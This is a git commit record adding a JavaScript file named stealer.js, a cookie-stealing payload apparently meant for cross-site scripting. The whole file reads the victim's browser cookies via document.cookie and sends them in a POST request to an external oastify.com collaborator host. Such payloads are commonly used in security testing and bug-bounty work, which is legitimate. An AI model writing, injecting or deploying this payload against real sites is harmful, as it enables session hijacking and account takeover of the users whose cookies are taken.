3013c88914b7a01bb66246c5a1b9b9990e74e293
Jay3shh <jayesh921@gmail.com>
2023-08-25 03:20:11 +0530

    Create stealer.js

---
+++ stealer.js
@@ -0,0 +1,18 @@
+var victimCookies=document.cookie
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    var response = xhr.responseText;
+    console.log(response);
+    // Process the response data here
+  } else if (xhr.readyState === 4) {
+    console.log('Request failed with status code:', xhr.status);
+    // Handle any errors that occur during the request
+  }
+};
+
+var requestBody = "cookies=" + victimCookies;
+xhr.send(requestBody);
